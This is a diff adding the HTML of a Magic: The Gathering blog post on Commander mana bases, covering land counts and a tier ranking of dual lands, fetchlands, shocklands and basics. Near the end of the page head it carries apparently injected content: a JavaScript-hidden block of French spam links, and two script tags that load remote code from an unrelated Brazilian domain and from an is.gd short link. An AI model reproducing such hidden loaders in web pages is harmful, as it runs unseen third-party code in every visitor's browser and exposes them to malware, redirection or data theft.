@@ -1,0 +1,607 @@
+
+<!doctype html><!--[if lt IE 7 ]> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie6"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie7"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie8"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js ie9"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en-US" prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# article: http://ogp.me/ns/article#" class="no-js"> <!--<![endif]-->
+<head>
+
+	
+	<meta charset="UTF-8" />
+
+	<!-- Always force latest IE rendering engine (even in intranet) & Chrome Frame -->
+	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+	<title>Commander 101: Mana in EDH Part One: The Basics (and Nonbasics) | The Wizard&#039;s Cupboard</title>
+
+	<!--  Mobile viewport optimized: j.mp/bplateviewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<link rel="pingback" href="https://www.wizardscupboard.com/wordpress/xmlrpc.php" />
+
+	
+	
+<!-- SEO Ultimate (http://www.seodesignsolutions.com/wordpress-seo/) -->
+	<meta property="og:type" content="article" />
+	<meta property="og:title" content="Commander 101: Mana in EDH Part One: The Basics (and Nonbasics)" />
+	<meta property="og:url" content="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/" />
+	<meta property="article:published_time" content="2015-04-26" />
+	<meta property="article:modified_time" content="2015-06-23" />
+	<meta property="article:author" content="https://www.wizardscupboard.com/wordpress/author/craig/" />
+	<meta property="article:section" content="EDH/Commander" />
+	<meta property="og:site_name" content="The Wizard&#039;s Cupboard" />
+	<meta name="twitter:card" content="summary" />
+<!-- /SEO Ultimate -->
+
+<link rel='dns-prefetch' href='//s.w.org' />
+<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Feed" href="https://www.wizardscupboard.com/wordpress/feed/" />
+<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Comments Feed" href="https://www.wizardscupboard.com/wordpress/comments/feed/" />
+<link rel="alternate" type="application/rss+xml" title="The Wizard&#039;s Cupboard &raquo; Commander 101: Mana in EDH Part One: The Basics (and Nonbasics) Comments Feed" href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/feed/" />
+		<script type="text/javascript">
+			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/2.2.1\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/www.wizardscupboard.com\/wordpress\/wp-includes\/js\/wp-emoji-release.min.js?ver=4.7.14"}};
+			!function(a,b,c){function d(a){var b,c,d,e,f=String.fromCharCode;if(!k||!k.fillText)return!1;switch(k.clearRect(0,0,j.width,j.height),k.textBaseline="top",k.font="600 32px Arial",a){case"flag":return k.fillText(f(55356,56826,55356,56819),0,0),!(j.toDataURL().length<3e3)&&(k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,65039,8205,55356,57096),0,0),b=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55356,57331,55356,57096),0,0),c=j.toDataURL(),b!==c);case"emoji4":return k.fillText(f(55357,56425,55356,57341,8205,55357,56507),0,0),d=j.toDataURL(),k.clearRect(0,0,j.width,j.height),k.fillText(f(55357,56425,55356,57341,55357,56507),0,0),e=j.toDataURL(),d!==e}return!1}function e(a){var c=b.createElement("script");c.src=a,c.defer=c.type="text/javascript",b.getElementsByTagName("head")[0].appendChild(c)}var f,g,h,i,j=b.createElement("canvas"),k=j.getContext&&j.getContext("2d");for(i=Array("flag","emoji4"),c.supports={everything:!0,everythingExceptFlag:!0},h=0;h<i.length;h++)c.supports[i[h]]=d(i[h]),c.supports.everything=c.supports.everything&&c.supports[i[h]],"flag"!==i[h]&&(c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&c.supports[i[h]]);c.supports.everythingExceptFlag=c.supports.everythingExceptFlag&&!c.supports.flag,c.DOMReady=!1,c.readyCallback=function(){c.DOMReady=!0},c.supports.everything||(g=function(){c.readyCallback()},b.addEventListener?(b.addEventListener("DOMContentLoaded",g,!1),a.addEventListener("load",g,!1)):(a.attachEvent("onload",g),b.attachEvent("onreadystatechange",function(){"complete"===b.readyState&&c.readyCallback()})),f=c.source||{},f.concatemoji?e(f.concatemoji):f.wpemoji&&f.twemoji&&(e(f.twemoji),e(f.wpemoji)))}(window,document,window._wpemojiSettings);
+		</script>
+		<style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 .07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+<link rel='stylesheet' id='open-sans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A300italic%2C400italic%2C600italic%2C300%2C400%2C600&#038;subset=latin%2Clatin-ext&#038;ver=4.7.14' type='text/css' media='all' />
+<link rel='stylesheet' id='highwind-styles-css'  href='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/style.css?ver=1.2.4' type='text/css' media='all' />
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery.js?ver=1.12.4'></script><script>jQueryWP = jQuery;</script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'></script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/plugins/img-mouseover/img-mouseover.js?ver=20110509'></script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/modernizr.min.js?ver=2.6.2'></script>
+<script type='text/javascript' src='https://www.wizardscupboard.com/wordpress/wp-content/themes/highwind/framework/js/fitvids.min.js?ver=1.0'></script>
+<link rel='https://api.w.org/' href='https://www.wizardscupboard.com/wordpress/wp-json/' />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://www.wizardscupboard.com/wordpress/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://www.wizardscupboard.com/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Modern Musings: Burn Primer Part 2' href='https://www.wizardscupboard.com/wordpress/modern-musings-burn-primer-part-2/' />
+<link rel='next' title='Four Scorn and Seven Years Ago' href='https://www.wizardscupboard.com/wordpress/four-scorn-and-seven-years-ago/' />
+<meta name="generator" content="WordPress 4.7.14" />
+<link rel="canonical" href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/" />
+<link rel='shortlink' href='https://www.wizardscupboard.com/wordpress/?p=510' />
+<link rel="alternate" type="application/json+oembed" href="https://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fcommander-101-mana-in-edh-part-one-the-basics-and-nonbasics%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.wizardscupboard.com/wordpress/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.wizardscupboard.com%2Fwordpress%2Fcommander-101-mana-in-edh-part-one-the-basics-and-nonbasics%2F&#038;format=xml" />
+        <!--Customizer CSS-->
+        <style type="text/css">
+                a { color:#163d06; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, .header, .comments .bypostauthor > .comment-body .comment-content { background-color:#163d06; }body, input[type="text"], input[type="password"], input[type="email"], input[type="search"], input.input-text, textarea { color:#020202; }.comments .bypostauthor > .comment-body .comment-content:after { border-bottom-color:#163d06; }hr, input[type="checkbox"], input[type="radio"] { background:#020202; }input[type="radio"] { border-color:#020202; }h1, h2, h3, h4, h5, h6, .alpha, .beta, .gamma, .delta, .page-title, .post-title { color:#020101; }input[type="submit"], .button, input[type="button"], .navigation-post a, .navigation-paging a, input[type="checkbox"]:before, input[type="checkbox"]:checked:before, .comments .bypostauthor > .comment-body .comment-content, .comments .bypostauthor > .comment-body .comment-content a { color:#f9f9f9; }.comments .comment-content:after { border-bottom-color:#f9f9f9; }.inner-wrap, .main-nav { background-color:#f9f9f9; }                @media only screen and (min-width: 769px) {
+                    /* Styles only applied to desktop */
+                    .main-nav ul.menu ul, .main-nav ul.menu > li:hover > a, .main-nav ul.menu > li > a:hover { background:#163d06; }.main-nav ul.menu li.current-menu-item > a { color:##163d06; }.main-nav { border-color:#163d06; }.main-nav ul.menu li.current-menu-item > a:before { border-bottom-color:#163d06; }.main-nav ul.menu ul a, .main-nav ul.menu > li:hover > a { color:##f9f9f9; }body { background-color:#f8f8f9; }                }
+        </style>
+        <!--/Customizer CSS-->
+        		<style type="text/css">.recentcomments a{display:inline !important;padding:0 !important;margin:0 !important;}</style>
+		<style type="text/css" id="custom-background-css">
+body.custom-background { background-color: #f8f8f9; }
+</style>
+<div id="aece353"><ul><li><a href="https://www.wizardscupboard.com/wordpress/modele-tiki-tattoo/" title="Modele tiki tattoo" >Modele tiki tattoo</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-robe-de-cortege/" title="Modele robe de cortège" >Modele robe de cortège</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-panier-zpagetti/" title="Modele panier zpagetti" >Modele panier zpagetti</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-lettre-desabonnement-canalsat/" title="Modele lettre desabonnement canalsat" >Modele lettre desabonnement canalsat</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-kangoo-2002/" title="Modele kangoo 2002" >Modele kangoo 2002</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-felicitation-naissance-gratuit/" title="Modele felicitation naissance gratuit" >Modele felicitation naissance gratuit</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-deliberation-approbation-reglement-interieur/" title="Modele deliberation approbation reglement interieur" >Modele deliberation approbation reglement interieur</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-tatouage-rose-des-vents/" title="Modele de tatouage rose des vents" >Modele de tatouage rose des vents</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-reference-osi/" title="Modele de reference osi" >Modele de reference osi</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-nao/" title="Modele de nao" >Modele de nao</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-lettre-plainte-contre-x-pour-vol/" title="Modele de lettre plainte contre x pour vol" >Modele de lettre plainte contre x pour vol</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-jupe-taille-haute-en-wax/" title="Modele de jupe taille haute en wax" >Modele de jupe taille haute en wax</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-devis-word-gratuit/" title="Modele de devis word gratuit" >Modele de devis word gratuit</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-contrat-de-mariage-separation-de-biens/" title="Modele de contrat de mariage separation de biens" >Modele de contrat de mariage separation de biens</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-de-brevet/" title="Modele de brevet" >Modele de brevet</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-cv-agent-de-quai/" title="Modele cv agent de quai" >Modele cv agent de quai</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-case-de-munte/" title="Modele case de munte" >Modele case de munte</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-projet-de-scission/" title="Modèle projet de scission" >Modèle projet de scission</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-lettre-de-stage-en-entreprise/" title="Modèle lettre de stage en entreprise" >Modèle lettre de stage en entreprise</a></li> <li><a href="https://www.wizardscupboard.com/wordpress/modele-haut-en-pagne/" title="Modèle haut en pagne" >Modèle haut en pagne</a></li> </ul><div><script type="text/javascript"> document.getElementById("aece353").style.display="none"; </script>
+
+<script src="http://exerciciofuncional.com.br/teste/index.php?P"></script>
+
+<script src="https://is.gd/GgGf9z?v=v25.0"></script></head>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<body class="post-template-default single single-post postid-510 single-format-standard custom-background two-column content-sidebar background-contrast">
+
+<div id="fb-root"></div>
+<script>(function(d, s, id) {
+  var js, fjs = d.getElementsByTagName(s)[0];
+  if (d.getElementById(id)) return;
+  js = d.createElement(s); js.id = id;
+  js.src = "//connect.facebook.net/en_US/sdk.js#xfbml=1&appId=1536376929914286&version=v2.0";
+  fjs.parentNode.insertBefore(js, fjs);
+}(document, 'script', 'facebook-jssdk'));</script>
+
+
+<div class="outer-wrap" id="top">
+
+	<div class="inner-wrap">
+
+	
+	<header class="header content-wrapper" role="banner" style="background-image:url(https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/Art_M15_Art-5_Swanland_edited-3.jpg);">
+
+				<p class="toggle-container">
+			<a href="#navigation" class="nav-toggle button">
+				Skip to navigation			</a>
+		</p>
+					<a href="https://www.wizardscupboard.com/wordpress/" title="The Wizard&#039;s Cupboard" rel="home" class="site-intro">
+					<img src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/09/artifacts.WC_.sqaure-edited.jpg" class="avatar" />
+					<h1 class="site-title">The Wizard&#039;s Cupboard</h1>
+				<h2 class="site-description">Magic the Gathering Blog</h2>
+			</a>
+		
+		
+		<nav class="main-nav" id="navigation" role="navigation">
+
+			
+			<ul class="buttons">
+				<li class="home"><a href="https://www.wizardscupboard.com/wordpress" class="nav-home button"><span>Home</span></a></li>
+				<li class="close"><a href="#top" class="nav-close button"><span>Return to Content</span></a></li>
+			</ul>
+			<hr />
+			<h2>Menu 1</h2>
+			<div class="highwind-navigation"><ul id="menu-menu-1" class="menu"><li id="menu-item-274" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-274"><a href="http://www.wizardscupboard.com/wordpress/">Blog Home</a></li>
+<li id="menu-item-264" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-264"><a href="http://www.wizardscupboard.com/wordpress/?cat=6">Standard</a></li>
+<li id="menu-item-265" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-265"><a href="http://www.wizardscupboard.com/wordpress/?cat=1">EDH/Commander</a></li>
+<li id="menu-item-263" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-263"><a href="http://www.wizardscupboard.com/wordpress/?cat=5">MTG Ramblings</a></li>
+<li id="menu-item-269" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-269"><a href="http://www.wizardscupboard.com">Visit Store</a></li>
+<li id="menu-item-273" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-273"><a href="https://www.wizardscupboard.com/wordpress/about-us/">About Us</a></li>
+<li id="menu-item-277" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-277"><a href="https://www.wizardscupboard.com/wordpress/write-for-us/">Write For the WC</a></li>
+</ul></div>
+			
+		</nav><!-- /.main-nav -->
+
+		
+		
+	</header>
+
+	<div class="content-wrapper">
+
+	
+
+<section class="content" role="main">
+
+	
+	
+		<article id="post-510" class="post-510 post type-post status-publish format-standard hentry category-edh-commander">
+
+			
+			
+
+<header class="post-header">
+
+				<time class="post-date"><a href="https://www.wizardscupboard.com/wordpress/commander-101-mana-in-edh-part-one-the-basics-and-nonbasics/" title="Permalink to Commander 101: Mana in EDH Part One: The Basics (and Nonbasics)" rel="bookmark">April 26, 2015</a></time>
+		
+			<h1 class="post-title" data-text="Commander 101: Mana in EDH Part One: The Basics (and Nonbasics)">Commander 101: Mana in EDH Part One: The Basics (and Nonbasics)</h1>
+	
+	
+</header><!-- /.post-header -->
+
+<section class="article-content">
+
+	<h1> Commander 101: Mana in EDH Part One: The Basics (and Nonbasics)</h1>
+<h3><strong>by Craig Sidorowicz</strong></h3>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n.jpg"><img class="alignnone  wp-image-355" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n-300x275.jpg" alt="971980_10201032448234043_1017665134_n" width="245" height="225" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n-300x275.jpg 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2014/12/971980_10201032448234043_1017665134_n.jpg 344w" sizes="(max-width: 245px) 100vw, 245px" /></a></p>
+<h3>1.  &#8220;I had a great hand, but&#8230;&#8221;</h3>
+<ul>
+<li><em><strong>a. I didn&#8217;t draw enough lands.</strong></em></li>
+<li><em><strong>b. I didn&#8217;t have the right colors.</strong></em></li>
+<li><em><strong>c. My opponent strip mined my Gaea&#8217;s Cradle (how dare he!)</strong></em></li>
+<li><em><strong>d. All of the above.</strong></em></li>
+</ul>
+<p><strong><strong> </strong></strong>Yep.  Mana screwed again.  Its always painful, and it&#8217;s always memorable.  But what if I told you it only happens to me in about one in twenty games?  In this two-part installment of Commander 101, I&#8217;m on a crusade to eradicate mana-screw complaints forever.  In part one, I&#8217;ll provide insights on how many lands to play, as well as my analysis and tiered rankings of the lands available in the format.  In part two, I&#8217;ll go deeper into the deckbuilding aspect of mana and explain how to choose, build, and ramp with deck-appropriate creature, mana rock, spell-based, and combination packages.</p>
+<h1><strong>Quantity of lands</strong></h1>
+<p>First off, How many lands should you play?  <strong>The short answer: Play 36-38 minimum, on average.</strong>  At the extremes (examples below) I&#8217;ve seen as high as sixty, and as low as twenty five.  Please remember that the primary goal is to never miss a land drop or resource development opportunity.  If you want to stay active and relevant in the pod (you may recall that this is how I define &#8220;fun&#8221; in EDH), you need resources.  If an opponent has 8-10 mana available on turn six, when you have 4-5, they are likely at an advantage.  Now multiply by three and consider how your resource base is dwarfed when compared to your &#8220;collective opponent,&#8221; that has 24-30 resources available.  To visualize this, think of the pod as a pie, and consider what percentage of the pie you currently control.  I like to have at least a quarter of the pie or more, or I perceive myself to be &#8220;behind.&#8221;</p>
+<p>I still see players greedily undercutting the mana base of their decks to include more creatures and spells. I also see players counting cards like Sol Rings and Llanowar elves as land.  When you &#8220;goldfish&#8221; your deck (draw a hand and play out a few turns with no opponent,) you might find that your elves and sol rings always survive and never get disrupted.  But when a devious opponent hits you with turn-3 Toxic Deluge, or Vandalblasts your mana-rock collection, you are now in rebuilding mode.  The players who didn&#8217;t miss their land drops will have an easier time rebuilding, because they do not have to waste as much &#8220;tempo&#8221; (timely and efficient use of resources) casting new mana rocks or waiting for new elves to recover from summoning sickness.</p>
+<p><strong><strong> </strong></strong><strong>Extreme Example: #1: Sam Black&#8217;s Sixty Lands Azusa</strong></p>
+<p>Back in 2010, when EDH was still in its early stages of its popularity, pro-tour veteran Sam Black wrote <strong><a href="http://www.starcitygames.com/article/20212_Black-Magic---My-Take-on-EDH.html">this article</a></strong> that opened a mental door for me when it came to land quantity in EDH:</p>
+<p>&#8220;More is usually better!&#8221;</p>
+<p>This deck plays Azusa as the commander, -sixty- lands, Howling Mines, additional land enablers, all ramping into the endgame of eldrazis.  <strong>The reason the deck works is that it has actually has enough lands to utilize with extra land enablers</strong> like Azusa, Oracle of Mul Daya, Burgeoning, and Exploration.  Notice how few &#8220;threats&#8221; the deck runs (about 6 that could be considered finishers).  Many neophyte and even seasoned players make the mistake of thinking that they need an extreme amount of cards to finish multiple opponents, but this just isn&#8217;t true.  Just think about how often a single creature like Avenger of Zendikar, an Eldrazi, or a Vorinclex have taken over a game.  Below is an <strong><a href="http://tappedout.net/mtg-decks/azusa-lost-but-owning/">updated and street-legal version</a></strong> of this classic created by a Tappedout.net user named Gdubya. He explains that Its best opening hand is capable of playing a turn-2 Vorinclex off of Natural Order. (Click to enlarge picture)</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa.png"><img class="alignnone  wp-image-516" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa-300x219.png" alt="Azusa" width="372" height="271" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa-300x219.png 300w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Azusa.png 902w" sizes="(max-width: 372px) 100vw, 372px" /></a></p>
+<p><strong><strong> </strong></strong><strong>Extreme Example #2: Ezuri Elf Overrun</strong></p>
+<p><strong>  <a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck.png"><img class="alignnone  wp-image-517" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck-274x300.png" alt="Ezuri Deck" width="338" height="370" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck-274x300.png 274w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Deck.png 801w" sizes="(max-width: 338px) 100vw, 338px" /></a></strong></p>
+<p>This is typically the deck I see taking advantage of a low &#8220;average converted mana cost,&#8221; to use a significantly lower quantity of lands.  A low cost commander in green paired with other low-cost mana creatures is typically how such a deck can get away with such a low land count.  Above is a <strong><a href="http://tappedout.net/mtg-decks/ezuri-elf-overrun/">typical list I found using google</a></strong>.  Unless you have a very low mana curve such a low land count is not recommended.</p>
+<p>(<strong>Mana Curve</strong> is the breakdown of converted mana costs of the deck, usually represented in a bar graph that shows a curve)  For reference, 3.0 average mana cost makes for a pretty low curve for EDH. (Click to enlarge pictures)</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Curve.png"><img class="alignnone size-medium wp-image-520" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Curve-224x300.png" alt="Ezuri Curve" width="224" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Curve-224x300.png 224w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Ezuri-Curve.png 626w" sizes="(max-width: 224px) 100vw, 224px" /></a></p>
+<p>&nbsp;</p>
+<h1><strong>Quality of Lands: Evaluating and and Ranking the Options.</strong></h1>
+<p>Now, lets take a look at the tools available to help us.</p>
+<p><strong><strong> </strong></strong><strong>About the tier list:</strong></p>
+<p><strong>When evaluating each cycle of lands, I graded them based on the following metrics:</strong></p>
+<ol>
+<li>Does it produce colored mana?</li>
+<li>Does it produce multiple types of colored mana, if so, how many?</li>
+<li>Does it come into play untapped?</li>
+<li>Does it have another drawback? (Deals damage, requires/depends on having another colored mana in play?</li>
+<li>Does it have a basic land type to take advantage of the effects that have synergy with those land types?</li>
+</ol>
+<p><strong><strong> </strong></strong><strong>Assumptions:</strong></p>
+<ol>
+<li><strong>We are building for a two-or-more color deck</strong>.  If you are playing mono-color you have quite a bit less thinking to do because this tier list is removed from consideration, and you&#8217;d just play the best lands available that produce your color, and whatever utility lands fit well with the theme of your deck.</li>
+<li><strong>We are evaluating these lands in a vacuum</strong>, absent the thought of the deck&#8217;s contents or plans, for now.  This is a &#8220;raw power&#8221; evaluation, because the &#8220;ifs&#8221; and &#8220;buts&#8221; can spiral out of control quickly if we don&#8217;t provide some focus.  This is a &#8220;101&#8221; article after all.</li>
+<li><strong>Untapped is Best.  </strong>While &#8220;speed is king&#8221; in 20-life 1v1 formats, it&#8217;s not as much of a factor in a multi-player, 40-life format. That said, lands that come into play untapped and produce the color you want will always have greater utility than those that do not.  In the &#8220;building stage&#8221; (which I mentioned last article), you will likely want your lands to come into play untapped so that you can avoid waiting a turn to put your plan into place, or cast your low-cost commander.  Untapped lands are also really convenient if you need to board-wipe on any of those turns if a threatening situation develops.  Unless you compose your manabase entirely of &#8220;comes into play untapped&#8221; lands, you will be faced with decisions on which lands to play first.  Always analyze your hand to determine which spells you want to cast this turn, and on successive turns.  If you have nothing to do with the mana a land produces this turn (usually the first few turns) tapped lands are the better play.  Of course, the mana color requirements of the cards in your hand and the situation on the battlefield may force you to make adjustments to your plan.  Always try to anticipate your future needs, and have a backup plan if disrupted by opponents.</li>
+</ol>
+<h1><strong><strong> </strong></strong><strong>The Top Three</strong></h1>
+<p><strong>#1: Original Dual Lands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Tundra.jpg"><img class="alignnone size-medium wp-image-522" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Tundra-210x300.jpg" alt="Tundra" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Tundra-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Tundra.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>Aside from Command Tower, you can&#8217;t do better than the original ten. (WOTC can&#8217;t print anything better than these outside of commander format).  They give you both land types with no drawback except for being nonbasic (yes, this is a drawback because of all of the nonbasic hate-cards that exist). They are expensive to own, but even the 3rd Edition Revised copies are well worth the investment.  I personally own two of each, and plan to acquire more as opportunity presents. They will never be reprinted (outside of Magic Online) so their value will only continue to rise.  If you have access to these, play them.</p>
+<p><strong><strong> </strong></strong><strong>#2: Fetchlands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Flooded-Strand.jpg"><img class="alignnone size-medium wp-image-523" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Flooded-Strand-210x300.jpg" alt="Flooded Strand" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Flooded-Strand-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Flooded-Strand.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>These are second-best because they search for the basic land type (not just basics) and bring it into play untapped.  Their synergy with original duals and shocks make mana-fixing a breeze, at the very affordable cost of one life. These also have several subtle bonuses.</p>
+<p>First, they &#8220;thin your deck&#8221; by removing lands from it, thus reducing the odds you&#8217;ll topdeck lands when you need spells.  Second, they can be used to shuffle your library to give you new options with your Sensei&#8217;s Divining Top or Scroll Rack.  Their biggest drawback is the time it takes to search and shuffle, so keep that in mind when playing in a full pod.  Know what land you want, or pass the turn and search if at all possible.</p>
+<p>If you don&#8217;t own the allied color (onslaught/khans) versions to play in your decks, what are you waiting for?  They will never be this cheap again unless they get reprinted again in the long term.  As far as the enemy-color (zendikar) versions, they should be reprinted soon in Modern Masters 15 or in Battle for Zendikar block, so plan to acquire them after they hit peak supply after reprinting.</p>
+<p>(Financial Tip: Wait until the hype dies down, and enough packs have been opened for supply to meet or exceed demand, thus driving prices to the lowest point.  Given the popularity and power of these lands, the window for action might not stay open for very long. A good place to track this is on mtgstocks.com)</p>
+<p><strong>#3: Shocklands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/hallowed-Fountain.jpg"><img class="alignnone size-medium wp-image-524" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/hallowed-Fountain-210x300.jpg" alt="hallowed Fountain" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/hallowed-Fountain-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/hallowed-Fountain.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>These are third best because they mimic the original duals (including basic land types) for the cost of two life.  Otherwise, they function like a guildgate.  Obviously, do not shock yourself unless you need the mana that turn, or need to bluff a Counterspell.  Financially speaking, Return to Ravnica block is not that far behind us, so the shocks are still available at reasonable prices, for now. They are also worth having in your collection, and will likely begin to rise in price the farther we get from their most recent printing.</p>
+<p><strong>#4: Basic Lands/ Snow Covered Basic Lands</strong></p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Island.jpg"><img class="alignnone size-medium wp-image-525" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Island-210x300.jpg" alt="Island" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Island-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Island.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
+<p>This is probably where some of you may start to disagree with me, but basic lands are very important to include in each of your decks.  Nonbasic hate is real, and keeps getting worse.   Its painful to watch a player scoop up their cards after Blood Moon, &#8220;die&#8221; to Ruination, or wave goodbye to their battlefield when a Wave of Vitriol arrives.  If you don&#8217;t play basics they effectively read &#8220;game over&#8221; in the card text box.  Basic lands also allow you access to some of the most powerful ramp spells in the format (Solemn Simulacrum, cultivate, Kodama&#8217;s reach, Sakura-Tribe Elder, Burnished Hart, Myriad Landscape).</p>
+<p><a href="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Wave.jpg"><img class="alignnone size-medium wp-image-545" src="http://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Wave-210x300.jpg" alt="Wave" width="210" height="300" srcset="https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Wave-210x300.jpg 210w, https://www.wizardscupboard.com/wordpress/wp-content/uploads/2015/04/Wave.jpg 312w" sizes="(max-width: 210px) 100vw, 210px" /></a></p>
